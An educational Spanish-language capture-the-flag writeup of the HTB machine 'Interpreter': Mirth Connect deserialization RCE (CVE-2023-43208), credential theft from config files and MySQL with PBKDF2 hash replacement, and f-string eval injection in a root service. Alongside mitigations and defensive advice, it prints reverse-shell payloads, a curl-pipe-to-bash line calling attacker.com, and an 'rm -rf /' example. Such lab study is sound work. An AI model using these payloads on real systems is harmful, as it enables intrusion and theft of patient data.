# INTERPRETER HTB - Writeup Educativo Profundo

## 🎓 Índice Educativo

1. [Contexto de la Máquina](#contexto)
2. [¿Qué es Mirth Connect?](#mirth-basics)
3. [Vulnerabilidades Explicadas](#vulnerabilities)
4. [Cómo Aprender a Explotar](#learning-path)
5. [Troubleshooting y Errores Comunes](#troubleshooting)
6. [Preguntas Frecuentes](#faq)

---

## 🏥 Contexto: ¿Por Qué Estudiamos Mirth Connect?

### El Mundo Real

Mirth Connect es un **servidor de integración médica** usado en hospitales y clínicas para conectar sistemas de información de salud:

- **Historia Clínica Electrónica (EHR):** Sistema donde se guardan datos del paciente
- **Laboratorio:** Sistema que genera resultados de análisis
- **Farmacia:** Sistema de medicamentos
- **Facturación:** Sistema de cobros

```
┌──────────────┐
│   EHR        │
│  (Hospital)  │
└────────┬─────┘
         │
         │ HL7 Message
         │ (Patient: John Doe, Age: 45)
         ▼
    ┌─────────────────┐
    │ MIRTH CONNECT   │◄──── Procesa, transforma, enruta
    │  (Integration)  │
    └────────┬────────┘
             │
    ┌────────┴────────┐
    ▼                 ▼
┌────────┐      ┌──────────────┐
│ Lab    │      │ Pharmacy     │
│System  │      │ System       │
└────────┘      └──────────────┘
```

En esta máquina, **comprometemos el servidor de integración** y ganamos acceso a toda la red hospitalaria.

### ¿Por Qué es Importante Aprender Esto?

- **Seguridad Médica:** Los datos de pacientes están en riesgo
- **Confidencialidad:** Violación de HIPAA/GDPR
- **Continuidad de Cuidados:** Interrupciones pueden ser fatales
- **Industrias Similares:** Las técnicas aplican a cualquier servidor de integración

---

## <a name="mirth-basics"></a>🔧 ¿Qué es Mirth Connect?

### Arquitectura Básica

```java
// Mirth Connect estructura interna

┌─────────────────────────────────────────┐
│  Mirth Connect Server (Java)             │
├─────────────────────────────────────────┤
│                                          │
│  ┌───────────────────────────────────┐ │
│  │ 1. LISTENERS (Reciben mensajes)   │ │
│  │  - MLLP Listener (port 6661)      │ │
│  │  - HTTP Listener (port 8080)      │ │
│  │  - TCP/UDP Listeners              │ │
│  └───────────────────────────────────┘ │
│                ▼                         │
│  ┌───────────────────────────────────┐ │
│  │ 2. CHANNELS (Lógica de negocio)  │ │
│  │  - Entrada: Parsea HL7            │ │
│  │  - Transformer: Modifica datos    │ │
│  │  - Salida: Enruta a destino       │ │
│  └───────────────────────────────────┘ │
│                ▼                         │
│  ┌───────────────────────────────────┐ │
│  │ 3. DATABASE (Almacena datos)      │ │
│  │  - MySQL/MariaDB                  │ │
│  │  - Usuarios y credenciales        │ │
│  │  - Historial de eventos           │ │
│  └───────────────────────────────────┘ │
│                                          │
└─────────────────────────────────────────┘
```

### Conceptos Clave para Entender

#### 1. HL7 (Health Level 7)

Un **formato estándar** para mensajes médicos:

```
MSH|^~\&|SendingApp|SendingFac|ReceivingApp|ReceivingFac|20230915120000||ADT^A01|MSG001|P|2.3
EVN|A01|20230915120000
PID|||000001||Smith^John||19800101|M||C|123 Main St^^New York^NY^10001^USA
```

**Desglose:**

| Campo | Significado |
|-------|-------------|
| `MSH` | Message Header - información del mensaje |
| `EVN` | Event Type - tipo de evento (admisión, alta, etc.) |
| `PID` | Patient Identification - datos del paciente |
| `Smith^John` | Nombre (Apellido^Nombre) |
| `19800101` | Fecha nacimiento (YYYYMMDD) |

#### 2. MLLP (Minimal Lower Layer Protocol)

Un protocolo simple para transmitir mensajes:

```
Estructura: 0x0B + HL7Message + 0x1C 0x0D

0x0B = Inicio (vertical tab)
0x1C = Fin (file separator)
0x0D = Carriage return

Ejemplo:
0x0B                    ← Inicio
MSH|^~\&|...            ← Mensaje HL7
0x1C 0x0D               ← Fin
```

**Por qué MLLP:**
- Protocolo ligero
- Usado en sistemas médicos legacy
- Fácil de parsear

#### 3. Channels (Canales)

Un **channel** es un procesador de mensajes:

```
ENTRADA (Listener)
        ▼
    TRANSFORMER
    (Modifica datos)
        ▼
    DESTINATION
    (Enruta a destino)
        ▼
    SALIDA
```

**Ejemplo de Transformer (JavaScript):**

```javascript
// Extrae nombre del paciente HL7
var firstname = msg['hl7'].PID.PID.5.split("^")[1];
var lastname = msg['hl7'].PID.PID.5.split("^")[0];

// Crea JSON para enviar a siguiente servicio
var output = {
    firstname: firstname,
    lastname: lastname,
    timestamp: java.lang.System.currentTimeMillis()
};

// Retorna JSON
JSON.stringify(output);
```

---

## <a name="vulnerabilities"></a>⚠️ Tres Vulnerabilidades Explicadas

### Vulnerabilidad #1: CVE-2023-43208 (Deserialization RCE)

#### ¿Qué es la Deserialization?

Imagina que quieres guardar un objeto Java en disco:

```java
// SERIALIZATION: Objeto Java → Bytes
class Person {
    String name = "John";
    int age = 30;
}
// Se convierte a: [bytes que representan Person]

// DESERIALIZATION: Bytes → Objeto Java
Person p = deserialize(bytes);
// Vuelve a crear el objeto
```

#### El Problema

Si los bytes vienen de un **atacante**, podemos hacer cosas malvadas:

```java
// VULNERABLE:
Object obj = xstream.fromXML(userInput);  // userInput es controlado por atacante
// Si userInput contiene un "gadget chain", se ejecuta código

// SEGURO:
try {
    xstream.allowTypes(new String[] {"com.myapp.User"});
    Object obj = xstream.fromXML(userInput);
} catch (SecurityException e) {
    // Rechaza clases no permitidas
}
```

#### Gadget Chains Explicado Fácilmente

Un **gadget chain** es como una serie de dominós que se cae:

```
Dominó 1: LazyMap.get(key)
          └─ Intenta obtener valor de clave
          └─ Clave no existe
          └─ Llama factory (Dominó 2)

Dominó 2: ChainedTransformer
          └─ Ejecuta serie de transformadores
          └─ Cada transformer modifica un dato
          └─ Último transformer: InvokerTransformer (Dominó 3)

Dominó 3: InvokerTransformer.transform()
          └─ Invoca un método arbitrario
          └─ Llama Runtime.getRuntime().exec(command)

Resultado: Comando ejecutado como Java application (usuario mirth)
```

**Visualización:**

```
Serialización Maliciosa
    ↓
XStream.fromXML()
    ↓
Deserializa LazyMap
    ↓
LazyMap accede a clave
    ↓
Invoca factory ChainedTransformer
    ↓
ChainedTransformer ejecuta transformers
    ↓
InvokerTransformer.transform()
    ↓
Runtime.exec("comando")
    ↓
Comando ejecutado como 'mirth'
```

#### Por Qué Mirth es Vulnerable

1. **XStream en classpath:** Mirth depende de XStream para procesar configuración
2. **Deserialization sin validación:** Endpoint `/api/users` deserializa sin whitelist
3. **Commons Collections4 + Lang3 disponible:** Las clases del gadget chain (`ChainedTransformer`, `InvokerTransformer`, `EventUtils`) están en el classpath

#### Mitigación

```java
// ANTES (Vulnerable)
xstream.fromXML(untrustedXML);

// DESPUÉS (Seguro)
// 1. Whitelisting de clases
xstream.allowTypes(new Class[] {User.class, Config.class});

// 2. O usar SafeXStream (no existe en versión vieja)
// 3. O validar entrada antes
if (!isValidXML(xml)) {
    throw new SecurityException("Invalid XML");
}

// 4. O actualizarse a versión > 4.4.0
```

---

### Vulnerabilidad #2: Extracción de Credenciales PBKDF2

#### ¿Qué es PBKDF2?

PBKDF2 = **Password-Based Key Derivation Function**

Es una forma "lenta" de convertir una contraseña en un hash:

```
Contraseña: "MyPassword123"
           ↓ (aplicar PBKDF2 600,000 veces)
           ↓
Hash: "8a5c7f2b9e1d4f6c..."

¿Por qué 600,000 veces?
- Para que tardé mucho en computarla
- Si un atacante tiene el hash, no puede hacer diccionario rápido
- Cada intento tarda 600,000 × (operación criptográfica)
```

#### Cómo Funciona PBKDF2 Internamente

```python
def PBKDF2(password, salt, iterations):
    """
    Simula PBKDF2-HMAC-SHA256
    """
    output = b""
    for i in range(iterations):
        # Cada iteración:
        # 1. Calcula HMAC(password, salt)
        # 2. Usa resultado anterior como entrada
        # 3. Repite 600,000 veces
        salt = hmac.sha256(password, salt)
    return salt  # Hash final
```

**Ejemplo Real:**

```
Iteración 1:   HMAC(key, salt) = abc123...
Iteración 2:   HMAC(key, abc123) = def456...
Iteración 3:   HMAC(key, def456) = ghi789...
...
Iteración 600,000: = RESULTADO FINAL
```

#### Formato de Almacenamiento en Mirth

```
PBKDF2 OUTPUT = 32 bytes (hash)
SALT = 8 bytes (aleatorio)

ALMACENADO EN BD:
┌─────────────────────────────────────┐
│ salt (8 bytes) + hash (32 bytes)    │
│ = 40 bytes totales                  │
│ = convertidos a Base64              │
│ = ~54 caracteres                    │
└─────────────────────────────────────┘

Ejemplo en base de datos:
Password: "ASdfQwerty12345..."  (54 caracteres en Base64)
```

#### Cómo Extraemos Credenciales

```bash
# Paso 1: Acceso como usuario 'mirth' (obtenido por RCE)
whoami
# mirth

# Paso 2: Encontrar archivo de configuración
MIRTH_PID=$(pgrep -f MirthLauncher)
cat /proc/$MIRTH_PID/cwd/conf/mirth.properties
# database.username=mirthdb
# database.password=MirthPass123!

# Paso 3: Conectar a MySQL
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod

# Paso 4: Ver tabla de usuarios y sus hashes
SELECT PERSON_ID, NAME, PASSWORD FROM PERSON_PASSWORD;
# PERSON_ID=1, NAME=admin, PASSWORD="ASdfQwerty12345..."
```

#### Generando Nuestro Propio Hash

En lugar de crackear el hash, generamos uno nosotros:

```python
import hashlib
import base64
import os

def crear_hash_pbkdf2(contraseña):
    """
    Crea un hash compatible con Mirth Connect 4.4.0
    """
    # Generar salt aleatorio (8 bytes)
    salt = os.urandom(8)
    
    # PBKDF2
    hash_output = hashlib.pbkdf2_hmac(
        'sha256',
        contraseña.encode(),
        salt,
        iterations=600000,  # Mismo valor que Mirth
        dklen=32            # 32 bytes
    )
    
    # Combinar: salt + hash
    completo = salt + hash_output
    
    # Convertir a Base64
    hash_base64 = base64.b64encode(completo).decode()
    
    return hash_base64

# Ejemplo
hash_nuevo = crear_hash_pbkdf2("MyNewPassword123!")
print(hash_nuevo)
# ASdfQwerty12345BcDeFgHiJkLmNoPqRsTuVwXyZ...

# Usar en MySQL
# UPDATE PERSON_PASSWORD SET PASSWORD='ASdfQwerty12345...' WHERE PERSON_ID=1;
```

#### ¿Por Qué es Efectivo?

1. **Tenemos credenciales válidas de BD** (mirthdb)
2. **Podemos conectar a MySQL**
3. **Podemos actualizar hashes** sin necesidad de crackearlos
4. **Podemos loguearnos con nuestra contraseña nueva**

---

### Vulnerabilidad #3: F-String Eval Injection en notif.py

#### ¿Qué son F-Strings?

F-strings son una forma de Python 3.6+ para formatear texto:

```python
# Normal string
nombre = "John"
edad = 30
msg = "Nombre: " + nombre + ", Edad: " + str(edad)

# F-string (más limpio)
msg = f"Nombre: {nombre}, Edad: {edad}"

# F-string con expresiones
msg = f"Próximo año tendrá: {edad + 1}"

# F-string con función
import os
msg = f"Usuario actual: {os.getenv('USER')}"
```

#### El Problema: eval() en F-Strings

Cuando usamos `eval()` con un f-string que contiene entrada del usuario:

```python
# VULNERABLE:
nombre_usuario = input("Ingrese nombre: ")  # Controlado por atacante

# Código vulnerable:
eval(f'f"{nombre_usuario}"')

# Si usuario ingresa:
# {__import__('os').system('whoami')}

# Entonces eval intenta:
# f"{__import__('os').system('whoami')}"

# Python:
# 1. Ve {expresión}
# 2. Evalúa __import__('os')
# 3. Llama .system('whoami')
# 4. ¡COMANDO EJECUTADO!
```

#### Cómo Funciona en notif.py

```python
# Contenido de /usr/local/bin/notif.py (simplificado)

from flask import Flask, request
app = Flask(__name__)

@app.route('/notify', methods=['POST'])
def notify():
    data = request.get_json()
    firstname = data.get('firstname')  # Entrada de usuario
    lastname = data.get('lastname')
    
    # VULNERABLE:
    message = f"Notification: {firstname} {lastname} registered"
    
    # Double eval = Código de atacante ejecutado
    try:
        result = eval(f'f"{message}"')
        return {'status': 'ok', 'message': result}
    except:
        return {'status': 'error'}, 500

# POST /notify
# JSON: {"firstname": "{__import__('os').system('id')}", "lastname": "Test"}
# 
# Python construye:
# message = "Notification: {__import__('os').system('id')} Test registered"
# eval(f'f"{message}"')
# ↓
# eval('f"Notification: {__import__(\'os\').system(\'id\')} Test registered"')
# ↓
# CÓDIGO EJECUTADO
```

#### Cómo llega entrada maliciosa a notif.py

```
┌─────────────────────────────────────────┐
│ 1. ATACANTE envía HL7 a puerto 6661     │
│                                         │
│ MSH|^~\&|...|                          │
│ PID|...|{__import__('os').system(...)} │
│        ^^^^^^payload^^^^^^^^^^^^^^^^^^│
└─────────────────────────────────────────┘
         ▼
┌─────────────────────────────────────────┐
│ 2. MIRTH recibe HL7                     │
│    Parsea y extrae campos                │
│    firstname = "{__import__('os').system(...)}│
└─────────────────────────────────────────┘
         ▼
┌─────────────────────────────────────────┐
│ 3. MIRTH procesa con Transformer        │
│    Convierte HL7 → JSON                 │
│    {"firstname": "{payload}", ...}      │
└─────────────────────────────────────────┘
         ▼
┌─────────────────────────────────────────┐
│ 4. MIRTH envía a notif.py               │
│    POST localhost:54321/notify          │
│    JSON con payload intacto              │
└─────────────────────────────────────────┘
         ▼
┌─────────────────────────────────────────┐
│ 5. notif.py recibe JSON                 │
│    Procesa f-string con eval()          │
│    ¡CODIGO EJECUTADO COMO ROOT!         │
└─────────────────────────────────────────┘
```

#### Reverse Shell Payload

```python
# Construimos payload que da reverse shell

# Opción 1: Comando directo
firstname = "{__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.10.16.5/5555 0>&1\"')}"

# Opción 2: Usando subprocess (más moderno)
firstname = "{__import__('subprocess').Popen(['bash', '-c', 'bash -i >& /dev/tcp/10.10.16.5/5555 0>&1'])}"

# Opción 3: Cargar script desde internet
firstname = "{__import__('os').system('curl http://attacker.com/shell.sh | bash')}"
```

#### Por Qué es Peligroso

```
notif.py corre como ROOT:
- root: /usr/bin/python3 /usr/local/bin/notif.py

Si ejecutamos comando desde dentro, corre como root:
- whoami → root
- /root/root.txt → Accesible
- /etc/shadow → Accesible
- Crear nuevas cuentas → Posible
- Instalar backdoors → Posible
```

#### Mitigación

```python
# VULNERABLE (versión actual)
result = eval(f'f"{message}"')

# OPCIÓN 1: Usar string.format() en lugar de eval
result = message.format()  # Pero no ejecuta código

# OPCIÓN 2: Usar template seguro
from jinja2 import Template
template = Template("Notification: {{ firstname }} registered")
result = template.render(firstname=firstname)

# OPCIÓN 3: Validar entrada
import re
if not re.match(r'^[a-zA-Z\s]+$', firstname):  # Solo letras y espacios
    return {'status': 'error'}, 400

# OPCIÓN 4: Nunca usar eval()
# NUNCA NUNCA NUNCA usar eval() con entrada de usuario
```

---

## <a name="learning-path"></a>📚 Camino de Aprendizaje

### Nivel 1: Fundamentos (Semana 1)

#### Día 1-2: Conceptos Básicos
```bash
# Aprender HL7
- Descargar especificación HL7 v2.3
- Entender estructura MSH, PID, OBX
- Practicar parsing HL7 manualmente

# Herramientas
- nmap (para escaneo)
- curl (para testing HTTP)
- netcat (para conexiones raw)
```

#### Día 3-4: Mirth Connect
```bash
# Instalación
- Descargar Mirth Connect 4.4.0
- Instalar localmente
- Crear canal básico (HL7 → TCP)

# Exploración
- Entender estructura de canales
- Ver logs de eventos
- Debuguear transformers
```

#### Día 5-7: Serialization
```bash
# Java Serialization
- Entender ObjectInputStream/ObjectOutputStream
- Crear objetos serializables
- Modificar bytes serializados

# Python (comparación)
- pickle module
- Diferencias con Java
- Risks de deserialization
```

### Nivel 2: Técnicas Ofensivas (Semana 2)

#### Día 1-2: Gadget Chains
```bash
# Aprenda gadget chains para XStream
- Entender CommonsCollections4 + Lang3
- Leer el XML payload del exploit (sorted-set + dynamic-proxy)
- Entender cómo ConstantTransformer → InvokerTransformer → Runtime.exec()

# Práctica
- Crear payload XML a mano
- Probar contra endpoint /api/users con header X-Requested-With: OpenAPI
- Usar rce_cmd.py para ver output de comandos via HTTP callback
```

#### Día 3-4: PBKDF2
```bash
# Criptografía básica
- HMAC-SHA256 manual
- PBKDF2 step-by-step
- Iteraciones y tiempo de cómputo

# Herramientas
- john (password cracking)
- hashcat
- Crear hashes custom
```

#### Día 5-7: Python Injection
```bash
# F-Strings
- Cómo funcionan internamente
- Limitaciones y capacidades
- Casos de uso seguros vs inseguros

# Injection Techniques
- Bypass de filtros
- Alternativas a __import__
- Cargar módulos
```

### Nivel 3: Explotación Completa (Semana 3)

#### Proyecto: Explotar INTERPRETER
```bash
# Paso 1: RCE (1-2 horas)
- Generar exploit CVE-2023-43208
- Obtener reverse shell
- Verificar como usuario 'mirth'

# Paso 2: Escalada Lateral (2-3 horas)
- Encontrar mirth.properties
- Extraer credenciales
- Acceder a MySQL
- Crear nuevo usuario o modificar hash

# Paso 3: Escalada a Root (2-3 horas)
- Descubrir notif.py
- Crear payload HL7 malicioso
- Inyectar vía Mirth channel
- Obtener reverse shell como root
```

---

## <a name="troubleshooting"></a>🔧 Troubleshooting

### Problema 1: "Connection refused" a puerto 6661

```bash
# Síntoma
$ nc -zv 10.129.1.43 6661
nc: connect to 10.129.1.43 port 6661 (tcp) failed: Connection refused

# Causa posible
- Mirth no está corriendo
- Firewall bloqueando
- Puerto incorrecto

# Solución
# 1. Verificar que Mirth esté corriendo
curl -s http://10.129.1.43/mirth-connect/api/server/version
# Si obtiene respuesta, Mirth está corriendo

# 2. Verificar con nmap
nmap -sV 10.129.1.43 -p 6661

# 3. Si dice "closed", el puerto está disponible pero no hay servicio
# Esperar a que Mirth inicie completamente
```

### Problema 2: "requests module not found" al correr rce.py

```bash
# Síntoma
$ python3 rce.py 10.129.1.110 10.10.14.2 4444
ModuleNotFoundError: No module named 'requests'

# Causa
- requests no instalado

# Solución
pip install requests
# o
pip3 install requests

# Probar
python3 rce.py TARGET LHOST 4444
```

### Problema 2b: Status 400 "X-Requested-With header"

```bash
# Síntoma
# El exploit devuelve 400 en vez de 500

# Causa
- Falta el header X-Requested-With: OpenAPI

# Solución
# Verificar que rce.py incluya el header correcto:
# headers={"Content-Type":"application/xml","X-Requested-With":"OpenAPI"}
```

### Problema 3: "Access denied" a MySQL

```bash
# Síntoma
$ mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
ERROR 1045 (28000): Access denied for user 'mirthdb'@'localhost'

# Causa posible
- Usuario/contraseña incorrecto
- MySQL no está escuchando en localhost
- Socket UNIX vs TCP

# Solución
# 1. Verificar que MySQL esté corriendo
ps aux | grep mysql
# Debería ver proceso mysqld

# 2. Verificar puerto
netstat -tlnp | grep 3306
# tcp  0  0 127.0.0.1:3306  0.0.0.0:*  LISTEN

# 3. Probar con socket
mysql -u root --socket=/var/run/mysqld/mysqld.sock

# 4. Si aún no funciona, la contraseña extraída es incorrecta
# Verificar archivo de propiedades de nuevo
```

### Problema 4: F-String Injection no ejecuta

```bash
# Síntoma
# Envías payload HL7 pero no obtienes reverse shell

# Causa posible
1. notif.py no está escuchando
2. Mirth channel no está creado
3. Payload mal formado

# Solución
# 1. Verificar que notif.py escuche
ss -tlnp | grep 54321
# LISTEN root python3 /usr/local/bin/notif.py

# 2. Crear canal en Mirth web UI
# Administration > Channels > New
# - Listener: HL7 MLLP (puerto 6661)
# - Destination: HTTP Post (http://localhost:54321/notify)

# 3. Probar payload simple
# Crear canal test que solo echo datos:
# En transformer: return "OK: " + msg['hl7'].PID.PID.5;

# 4. Si no funciona, revisar logs
tail -f /var/log/mirth-connect/core.log
```

---

## <a name="faq"></a>❓ Preguntas Frecuentes

### P: ¿Por qué Mirth está comprometido?

**R:** Mirth Connect 4.4.0 tiene 3 vulnerabilidades graves:

1. **CVE-2023-43208:** Deserialization RCE en XStream (pre-autenticado)
2. **Gestión de credenciales:** Archivo de propiedades contiene credenciales en texto plano
3. **Code injection:** notif.py usa eval() con entrada de usuario

En producción, estas vulnerabilidades permitirían a un atacante:
- Acceder a datos de pacientes
- Modificar información médica
- Interrumpir servicios
- Propagar malware

---

### P: ¿Cómo se previene CVE-2023-43208?

**R:** Opciones:

1. **Actualizar:** A versión > 4.4.0 (pero verificar que la versión nueva sea segura)
2. **Parche:** Aplicar parche de XStream que implementa whitelist
3. **WAF:** Implementar Web Application Firewall que bloquee payloads sospechosos
4. **Monitoreo:** Detectar intentos de deserialization

**Ejemplo WAF rule:**
```
IF request.endpoint == "/api/users"
  AND request.contentType == "application/xml"
  AND request.body CONTAINS "java.lang.Runtime"
  THEN block_request()
```

---

### P: ¿Por qué PBKDF2 con 600k iteraciones?

**R:** Balance entre seguridad y rendimiento:

- **Pocas iteraciones (ej: 1,000):** Fácil de crackear (10 millones hashes/segundo)
- **Muchas iteraciones (ej: 600,000):** Tarda 600x más, defensa más fuerte
- **Muy muchas (ej: 10 millones):** Demasiado lento incluso para login legítimo

En 2023, 600k iteraciones es mínimo aceptable. Lo ideal es:
- **Argon2id:** 3-4 iteraciones con memory cost
- **scrypt:** 2^14 CPU cost, memory cost
- **bcrypt:** 12+ rounds

---

### P: ¿Puedo crackear el hash PBKDF2?

**R:** En teoría sí, en práctica muy difícil:

```
Tiempo para crackear 1 contraseña de 8 caracteres:
- 600k iteraciones PBKDF2: ~100 años (CPU single)
- Con GPU: ~10 años (más realista)
- Con ASIC: Posible en años si mucho dinero

Mejor estrategia: Generar hash propio (lo que hicimos)
```

---

### P: ¿Por qué notif.py corre como root?

**R:** Mala configuración en el sistema:

```bash
# Debería ser
/usr/local/bin/notif.py corre como usuario 'www-data' (no privilegiado)

# Pero está
/usr/local/bin/notif.py corre como root (causa raíz del acceso total)
```

**Principio de seguridad:** **Least Privilege**
- Todo servicio debe correr con mínimos permisos necesarios
- notif.py solo necesita escribir a log
- No necesita ser root

---

### P: ¿Cómo aprendo más?

**R:** Recursos:

1. **OWASP:** https://owasp.org/www-community/Deserialization_of_untrusted_data
2. **PortSwigger:** https://portswigger.net/web-security/deserialization
3. **YouTube:** Buscar "Java gadget chains explained"
4. **GitHub:** Buscar "CVE-2023-43208 exploit" o "XStream gadget chain"
5. **Práctica:** Intentar otros writeups de máquinas HTB similar dificultad

---

### P: ¿Puedo reparar notif.py?

**R:** Sí, así:

```python
# VULNERABLE (actual)
result = eval(f'f"{message}"')

# REPARADO
# Opción 1: No usar eval nunca
result = f"Notification: {firstname} {lastname} registered"

# Opción 2: Validar entrada
import re
if not re.match(r'^[a-zA-Z\s]+$', firstname):
    return {'status': 'error'}, 400
result = f"Notification: {firstname} {lastname} registered"

# Opción 3: Usar template engine
from jinja2 import Template
template = Template("Notification: {{ firstname }} {{ lastname }} registered")
result = template.render(firstname=firstname, lastname=lastname)
```

---

### P: ¿Qué es "eval" y por qué es peligroso?

**R:**

```python
# eval() = ejecuta código Python como string

# Seguro
x = eval("1 + 1")  # → 2

# PELIGROSO
user_code = "__import__('os').system('rm -rf /')"
eval(user_code)  # ¡COMANDO EJECUTADO!

# ¿Por qué?
# eval() ejecuta cualquier código Python válido
# Si entrada es controlada por atacante, RCE garantizado

# Regla: NUNCA usar eval() con entrada de usuario
# NUNCA NUNCA NUNCA
```

---

### P: ¿Cómo haría un Blue Team para defender?

**R:**

```
1. DETECCIÓN
   - IDS: Alertar en "/api/users" con payloads sospechosos
   - Logs: Alertar en errores de deserialization
   - SIEM: Correlacionar intentos fallidos

2. PREVENCIÓN
   - WAF: Bloquear XML con gadget chains
   - Network: Segregar Mirth en VLAN médica
   - Firewall: Bloquear conexiones no autorizadas a MySQL

3. RESPUESTA
   - Aislar servidor Mirth
   - Revisar logs de actividad
   - Cambiar credenciales de BD
   - Restaurar desde backup limpio

4. REMEDIACIÓN
   - Actualizar a Mirth > 4.4.0
   - Aplicar parches de XStream
   - Implementar whitelist de clases
   - Reparar notif.py (eliminar eval)
```

---

## 🎓 Conclusión

INTERPRETER es una excelente máquina para aprender:

✅ **Deserialization RCE** (CVE-2023-43208)
✅ **Extracción de credenciales** (PBKDF2 + archivos config)
✅ **Code Injection** (F-string eval)
✅ **Movimiento lateral** (Horizontal privilege escalation)
✅ **Escalada vertical** (Vert privilege escalation)

Las técnicas aplicadas son reales en:
- Auditorías de seguridad médica
- Pentesting de servidores integración
- Bug bounties en healthcare
- Evaluaciones de compliance HIPAA/GDPR

---

**Éxito en tu aprendizaje y práctica segura con HTB! 🚀**

*Escribo este documento esperando que entiendas no solo el "cómo" sino el "por qué" de cada paso.*
